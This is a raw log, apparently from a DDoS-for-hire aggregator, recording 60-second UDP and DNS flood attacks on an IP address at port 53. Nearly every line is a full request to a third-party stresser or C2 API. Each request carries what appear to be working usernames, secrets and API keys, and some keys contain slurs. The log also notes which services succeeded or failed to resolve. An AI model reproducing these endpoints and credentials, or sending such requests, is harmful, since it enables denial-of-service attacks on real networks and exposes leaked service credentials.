+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&secret=snowy&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: http://resemble.wtf:444/resembleapi?key=sis212sa2ass&target=70.70.70.59&port=53&time=60&method=udp-star
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://crtz.top/api/attack?username=chefe&secret=chefeapi09&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&key=snowy&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://crtz.top/api/attack?username=chefe&secret=chefeapi09&host=70.70.70.59&port=53&time=60&method=UDPDROP
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&secret=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=stopbegsapi&secret=sexybrofrngl&host=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://wrldsecurity.net/api/attack?username=pathc2api&secret=643t5ge4336y3467y34&host=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://akarui.fyi/api/attack?username=sins&key=sins@gg$$$&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.kaitenc2.de/api/fdd7d1243c4105b2/attack?target=70.70.70.59&port=53&duration=60&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://api.kaitenc2.de/api/attack?username=josh&password=balls&target=70.70.70.59&port=53&duration=60&method=.udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://insanesec.com/api/start?username=flcty&key=FEf6FfnlGsish2F&target=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://apisystem.herios-stress.xyz/api/attack?username=whosdior&key=changeme&host=70.70.70.59&port=53&time=60&method=dns - Get "https://apisystem.herios-stress.xyz/api/attack?username=whosdior&key=changeme&host=70.70.70.59&port=53&time=60&method=dns": tls: failed to verify certificate: x509: certificate signed by unknown authority
+2024/12/10 16:41:16 [ATTACK] Error sending request to: https://apisystem.herios-stress.xyz/api/attack?username=toring&key=tsukinetworks&host=70.70.70.59&port=53&duration=60&method=udpplain - Get "https://apisystem.herios-stress.xyz/api/attack?username=toring&key=tsukinetworks&host=70.70.70.59&port=53&duration=60&method=udpplain": tls: failed to verify certificate: x509: certificate signed by unknown authority
+2024/12/10 16:41:16 [ATTACK] Sending request to: http://93.123.85.244/api/attack?key=nigga&host=70.70.70.59&port=53&time=60&method=udp-gbps
+2024/12/10 16:41:16 [ATTACK] Sending request to: https://apisystem.nguyenletriloc.pro/api/attack?username=begs&secret=balls&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:16 [ATTACK] Sending request to: http://93.123.85.53/api.php?key=flshhhh&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:26 New Attack (API)!
+Username: root
+Target: 70.70.70.59
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://homicide-api.lol/api/attack?username=IceyCody&secret=IceyCody&host=70.70.70.59&port=53&time=60&method=!udp - Get "https://homicide-api.lol/api/attack?username=IceyCody&secret=IceyCody&host=70.70.70.59&port=53&time=60&method=!udp": dial tcp: lookup homicide-api.lol: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: http://toxicipstresser.cloud:6969/api/attack?username=xdrop&secret=balls&host=70.70.70.59&port=60&time=60&method=udp - Get "http://toxicipstresser.cloud:6969/api/attack?username=xdrop&secret=balls&host=70.70.70.59&port=60&time=60&method=udp": dial tcp: lookup toxicipstresser.cloud: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=udp-fun - Get "https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=udp-fun": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: http://virusc2.xyz:6969/api/attack?username=heiken&secret=sigma123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS - Get "http://virusc2.xyz:6969/api/attack?username=heiken&secret=sigma123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS": dial tcp: lookup virusc2.xyz: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: http://virusc2.xyz:6969/api/attack?username=chefe&secret=123123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS - Get "http://virusc2.xyz:6969/api/attack?username=chefe&secret=123123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS": dial tcp: lookup virusc2.xyz: no such host
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://crtz.top/api/attack?username=tsukiapi&secret=wixkwn193jen&host=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.papernetwork.xyz/api/attack?username=flcty&key=MBenz300&target=70.70.70.59&port=53&duration=60&method=udp
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=gudp_api
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://api.stdstresser.xyz/api/attack?username=wrykw810&secret=wrykw810&host=70.70.70.59&port=53&time=60&method=udp-dn - Get "https://api.stdstresser.xyz/api/attack?username=wrykw810&secret=wrykw810&host=70.70.70.59&port=53&time=60&method=udp-dn": dial tcp: lookup api.stdstresser.xyz: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?&key=ggbro420&host=70.70.70.59&port=53&time=60&method=udp-fun - Get "https://api.vortexa-services.xyz/api?&key=ggbro420&host=70.70.70.59&port=53&time=60&method=udp-fun": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://brainc2.uk/api/api.php?key=projectwrld&host=70.70.70.59&port=53&time=60&method=udp - Get "https://brainc2.uk/api/api.php?key=projectwrld&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup brainc2.uk: no such host
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=gudp_api
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=udp_api
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://insanesec.com/api/start?username=flcty&key=FEf6FfnlGsish2F&target=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://mythicalstressapi.net/?key=j2ys2wydzbl2ir48elgojabv6rmjfs&host=70.70.70.59&port=53&time=60&method=UDPRANDOM
+2024/12/10 16:41:26 [ATTACK] Error sending request to: http://api.quantiumcode.pl/api/attack?host=70.70.70.59&port=53&time=60&method=udp-vip&key=1234&username=darkc2 - Get "http://api.quantiumcode.pl/api/attack?host=70.70.70.59&port=53&time=60&method=udp-vip&key=1234&username=darkc2": dial tcp: lookup api.quantiumcode.pl: no such host
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://mythicalstressapi.net/?key=j2ys2wydzbl2ir48elgojabv6rmjfs&host=70.70.70.59&port=53&time=60&method=UDPAU
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://1337.rest/api.php?api_key=2b852c3e2333f0448ba17c3df2ad18ca&target=70.70.70.59&time=60&port=53&method=UDP-BOOM&concurrents=1
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://1337.rest/api.php?api_key=2b852c3e2333f0448ba17c3df2ad18ca&target=70.70.70.59&time=60&port=53&method=UDP-BYPASS&concurrents=1
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api-sona.xyz/api/attack?username=glock&secret=glock&host=70.70.70.59&port=53&time=60&method=udp-pps
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://akitz.online/api/attack?username=fedworld&key=fedworld&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:26 [ATTACK] Sending request to: http://93.123.85.244/api/attack?key=nigga&host=70.70.70.59&port=53&time=60&method=udp-gbps
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=u85y7r438t76g4389u6t8y943586&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=543u7yrf893wu65t3&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://kraysecurity.com/api/api.php?key=0sUU6IW0ZAaUllWX&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:26 [ATTACK] Error sending request to: http://connect-synth.xyz:3000/api/101be105959fe620/attack?&target=70.70.70.59&port=53&time=60&method=udp_api - Get "http://connect-synth.xyz:3000/api/101be105959fe620/attack?&target=70.70.70.59&port=53&time=60&method=udp_api": dial tcp: lookup connect-synth.xyz: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: http://hideaki-api.awaken-proxy-api.xyz:443/api/attack?username=begs&key=curry&host=70.70.70.59&port=53&time=60&method=gudp - Get "http://hideaki-api.awaken-proxy-api.xyz:443/api/attack?username=begs&key=curry&host=70.70.70.59&port=53&time=60&method=gudp": dial tcp: lookup hideaki-api.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=ggbro900&host=70.70.70.59&port=53&time=60&method=udp - Get "https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=ggbro900&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup chronos.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=riley&host=70.70.70.59&port=53&time=60&method=udp - Get "https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=riley&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup chronos.awaken-proxy-api.xyz: no such host
+2024/12/10 16:41:26 [ATTACK] Sending request to: http://93.123.85.244/api/attack?username=begs&key=noballs&host=70.70.70.59&time=60&port=60&method=UDP-LONE
+2024/12/10 16:41:26 [ATTACK] Error sending request to: http://proxy.blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns - Get "http://proxy.blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup proxy.blankc2.fun: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: http://proxy.blankc2.fun:6968/api/attack/api/attack?username=begs&password=rileyrowe420&target=70.70.70.59&port=53&time=60&method=dns - Get "http://proxy.blankc2.fun:6968/api/attack/api/attack?username=begs&password=rileyrowe420&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup proxy.blankc2.fun: no such host
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://hackar.stresser.rip/api/attack?username=stopbegs&key=stopbegs&host=70.70.70.59&port=53&time=60&method=udpbypass
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=u85y7r438t76g4389u6t8y943586&host=70.70.70.59&port=53&time=60&method=UDP-PPS
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://ddos.srv.lat/attack?token=nGS4bDqVidKO4qGNvF2WWw&host&host=70.70.70.59&port=53&time=60&method=!udpv2&concs=1 - Get "https://ddos.srv.lat/attack?token=nGS4bDqVidKO4qGNvF2WWw&host&host=70.70.70.59&port=53&time=60&method=!udpv2&concs=1": dial tcp: lookup ddos.srv.lat: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://ddos.srv.lat/attack?token=MpuQPllkwUFzZ8elnu5fPU&host=70.70.70.59&port=53&time=60&method=out-udp&concs=1 - Get "https://ddos.srv.lat/attack?token=MpuQPllkwUFzZ8elnu5fPU&host=70.70.70.59&port=53&time=60&method=out-udp&concs=1": dial tcp: lookup ddos.srv.lat: no such host
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://miami-api.cc/api/attack?username=flcty&secret=RyXMfmrXu10s&target=70.70.70.59&port=53&duration=60&method=!UDP
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://hackar.stresser.rip/api/attack?username=stopbegs&key=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:26 [ATTACK] Sending request to: http://ddos.africa:8080/api/attack?username=moneky&password=monkey&target=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:26 [ATTACK] Sending request to: http://proxy.blanknetwork.fun:8080/api/attack?username=begs&password=123&target=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:26 [ATTACK] Sending request to: http://satanservices.xyz/api/attack?username=lixl&key=iPxrkan&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:26 [ATTACK] Error sending request to: http://blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns - Get "http://blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup blankc2.fun: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: http://chronos.awaken-network.net:443/api/attack?username=toring&key=toring111&host=70.70.70.59&port=53&duration=60&method=UDP - Get "http://chronos.awaken-network.net:443/api/attack?username=toring&key=toring111&host=70.70.70.59&port=53&duration=60&method=UDP": dial tcp: lookup chronos.awaken-network.net: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: http://blankc2.fun:8080/api/attack?username=fedworld&password=123&target=70.70.70.59&port=53&time=60&method=udp - Get "http://blankc2.fun:8080/api/attack?username=fedworld&password=123&target=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup blankc2.fun: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=udpbypass - Get "https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=udpbypass": dial tcp: lookup api.autumn-network.xyz: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=pps - Get "https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.59&port=53&time=60&method=pps": dial tcp: lookup api.autumn-network.xyz: no such host
+2024/12/10 16:41:26 [ATTACK] Sending request to: http://toxic-c2.de:6969/api/attack?username=vse&secret=getfucked&host=70.70.70.59&port=53&time=60&method=UDP-VSE
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://glacier-api.xyz/api/attack?username=chefe&key=Cwel123&host=70.70.70.59&time=60&port=53&method=UDP-BYPASS
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://overdose.sbs/api/attack?username=projectworld&key=projectworld121&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://overdose.sbs/api/attack?username=begs&key=balls&host=70.70.70.59&port=53&time=60&method=udp-dose
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://private.bartrickc2.ovh/api/attack?username=@stopbegs&secret=@stopbegs&host=70.70.70.59&port=53&time=60&method=l4-udp - Get "https://private.bartrickc2.ovh/api/attack?username=@stopbegs&secret=@stopbegs&host=70.70.70.59&port=53&time=60&method=l4-udp": dial tcp: lookup private.bartrickc2.ovh: no such host
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.arthurc2.xyz/api/attack?username=begs&secret=balls&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.leanc2.dev/api/attack?username=fedworld&key=7A8hgFeWq33&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://kodachi.xyz/api/attack?username=api&key=api1234&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.vacstresser.ru/api?key=e87a0d23-f8c1-4525-bdef-c52425eb7e71&host=70.70.70.59&port=53&duration=60&method=UDPBYPASS
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://glacier-api.xyz/api/attack?username=chefe&key=Cwel123&host=70.70.70.59&time=60&port=53&method=UDP-PPS
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2 - Get "https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2": dial tcp: lookup c2.furry.ong: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2 - Get "https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.59&port=53&time=60&method=mix2": dial tcp: lookup c2.furry.ong: no such host
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://api.tsuki-solutions.cc/api/attack?username=securinq&key=balls&host=70.70.70.59&port=53&time=60&method=udp-vip - Get "https://api.tsuki-solutions.cc/api/attack?username=securinq&key=balls&host=70.70.70.59&port=53&time=60&method=udp-vip": dial tcp: lookup api.tsuki-solutions.cc: no such host
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.colombia-c2.wtf/api/attack?username=project&secret=passwd&host=70.70.70.59&time=60&port=53&method=udp
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=stopbegsapi&secret=kieran&host=70.70.70.59&port=53&time=60&method=udpbypass
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=world&secret=123123&host=70.70.70.59&time=60&port=53&method=dns
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://api.skibidi.sbs/api/attack?username=tonhocau&secret=change&host=70.70.70.59&port=53&time=60&method=dns - Get "https://api.skibidi.sbs/api/attack?username=tonhocau&secret=change&host=70.70.70.59&port=53&time=60&method=dns": stopped after 10 redirects
+2024/12/10 16:41:26 [ATTACK] Sending request to: http://85.192.56.228/api.php?key=milka&target=70.70.70.59&duration=60&method=gudp&method_type=udp&port=53
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=stopbegsapi&secret=sexybrofrngl&host=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://yuze-api.xyz/api/attack?username=x2u&secret=x2uisop$30&host=70.70.70.59&port=53&time=60&method=!udpplain
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.inverse.sh?token=ctKmcvX4aeZVXLF2O28uHx&host=70.70.70.59&port=53&time=60&method=UDP-SOURCE
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.inverse.sh?token=2DrvPtgCrvqT0x04XmSOsY&target={target}&port={port}&duration={duration}&method=UDP-SOURCE&concs=2
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://yuze-api.xyz/api/attack?username=x2u&secret=x2uisop$30&host=70.70.70.59&port=53&time=60&method=!udp
+2024/12/10 16:41:26 [ATTACK] Sending request to: http://2.59.117.173:555/api/?key=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://gorilla-api.su/api/attack?username=xdrop&secret=24xdrop23&host=70.70.70.59&port=53&time=60&method=dns - Get "https://gorilla-api.su/api/attack?username=xdrop&secret=24xdrop23&host=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup gorilla-api.su: no such host
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://mythicalstressapi.net/?key=3ichqv9ulnq8lp62ylx6qi3tgyl5mh&host=70.70.70.59&port=53&time=60&method=UDPRAW
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://phantom.cool/api/attack?token={token}&host={host}&port={port}&time={time}&method=GUDP - Get "https://phantom.cool/api/attack?token={token}&host={host}&port={port}&time={time}&method=GUDP": dial tcp: lookup phantom.cool: no such host
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://aetherapi.com/api/attack?username=begs&secret=balls&host=70.70.70.59&port=53&time=60&method=api-udp
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.frosty.rip/rocky/api/v1/attack?license=saturnednigga&host=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&secret=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.frosty.rip/kittybooter/api/v1/attack?license=saturnednigga&host=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&secret=snowy&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://crtz.top/api/attack?username=chefe&secret=chefeapi09&host=70.70.70.59&port=53&time=60&method=UDPDROP
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&key=snowy&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://crtz.top/api/attack?username=chefe&secret=chefeapi09&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:26 [ATTACK] Error sending request to: https://aggu.spacey.sh/aggu/api?username=saturned&key=saturned&host=70.70.70.59&port=53&time=60&method=udp-bypass - Get "https://aggu.spacey.sh/aggu/api?username=saturned&key=saturned&host=70.70.70.59&port=53&time=60&method=udp-bypass": dial tcp: lookup aggu.spacey.sh: no such host
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://akarui.fyi/api/attack?username=sins&key=sins@gg$$$&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://wrldsecurity.net/api/attack?username=pathc2api&secret=643t5ge4336y3467y34&host=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:26 [ATTACK] Sending request to: https://akarui.fyi/api/attack?username=sins&key=sins@gg$$$&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:27 [ATTACK] Sending request to: https://api.kaitenc2.de/api/fdd7d1243c4105b2/attack?target=70.70.70.59&port=53&duration=60&method=udp
+2024/12/10 16:41:27 [ATTACK] Error sending request to: https://apisystem.herios-stress.xyz/api/attack?username=whosdior&key=changeme&host=70.70.70.59&port=53&time=60&method=dns - Get "https://apisystem.herios-stress.xyz/api/attack?username=whosdior&key=changeme&host=70.70.70.59&port=53&time=60&method=dns": tls: failed to verify certificate: x509: certificate signed by unknown authority
+2024/12/10 16:41:27 [ATTACK] Error sending request to: https://apisystem.herios-stress.xyz/api/attack?username=toring&key=tsukinetworks&host=70.70.70.59&port=53&duration=60&method=udpplain - Get "https://apisystem.herios-stress.xyz/api/attack?username=toring&key=tsukinetworks&host=70.70.70.59&port=53&duration=60&method=udpplain": tls: failed to verify certificate: x509: certificate signed by unknown authority
+2024/12/10 16:41:27 [ATTACK] Sending request to: https://api.kaitenc2.de/api/attack?username=josh&password=balls&target=70.70.70.59&port=53&duration=60&method=.udp
+2024/12/10 16:41:37 New Attack (API)!
+Username: root
+Target: 70.70.70.59
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2024/12/10 16:41:37 [ATTACK] Error sending request to: http://virusc2.xyz:6969/api/attack?username=heiken&secret=sigma123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS - Get "http://virusc2.xyz:6969/api/attack?username=heiken&secret=sigma123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS": dial tcp: lookup virusc2.xyz: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: http://virusc2.xyz:6969/api/attack?username=chefe&secret=123123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS - Get "http://virusc2.xyz:6969/api/attack?username=chefe&secret=123123&host=70.70.70.59&port=53&time=60&method=.UDP-GBPS": dial tcp: lookup virusc2.xyz: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://api.stdstresser.xyz/api/attack?username=wrykw810&secret=wrykw810&host=70.70.70.59&port=53&time=60&method=udp-dn - Get "https://api.stdstresser.xyz/api/attack?username=wrykw810&secret=wrykw810&host=70.70.70.59&port=53&time=60&method=udp-dn": dial tcp: lookup api.stdstresser.xyz: no such host
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://mythicalstressapi.net/?key=j2ys2wydzbl2ir48elgojabv6rmjfs&host=70.70.70.59&port=53&time=60&method=UDPRANDOM
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://brainc2.uk/api/api.php?key=projectwrld&host=70.70.70.59&port=53&time=60&method=udp - Get "https://brainc2.uk/api/api.php?key=projectwrld&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup brainc2.uk: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://homicide-api.lol/api/attack?username=IceyCody&secret=IceyCody&host=70.70.70.59&port=53&time=60&method=!udp - Get "https://homicide-api.lol/api/attack?username=IceyCody&secret=IceyCody&host=70.70.70.59&port=53&time=60&method=!udp": dial tcp: lookup homicide-api.lol: no such host
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://1337.rest/api.php?api_key=2b852c3e2333f0448ba17c3df2ad18ca&target=70.70.70.59&time=60&port=53&method=UDP-BOOM&concurrents=1
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://akitz.online/api/attack?username=fedworld&key=fedworld&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?&key=ggbro420&host=70.70.70.59&port=53&time=60&method=udp-fun - Get "https://api.vortexa-services.xyz/api?&key=ggbro420&host=70.70.70.59&port=53&time=60&method=udp-fun": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=udp-fun - Get "https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=udp-fun": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:37 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.59&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api.papernetwork.xyz/api/attack?username=flcty&key=MBenz300&target=70.70.70.59&port=53&duration=60&method=udp
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://api-sona.xyz/api/attack?username=glock&secret=glock&host=70.70.70.59&port=53&time=60&method=udp-pps
+2024/12/10 16:41:37 [ATTACK] Error sending request to: http://toxicipstresser.cloud:6969/api/attack?username=xdrop&secret=balls&host=70.70.70.59&port=60&time=60&method=udp - Get "http://toxicipstresser.cloud:6969/api/attack?username=xdrop&secret=balls&host=70.70.70.59&port=60&time=60&method=udp": dial tcp: lookup toxicipstresser.cloud: no such host
+2024/12/10 16:41:37 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=u85y7r438t76g4389u6t8y943586&host=70.70.70.59&port=53&time=60&method=UDP
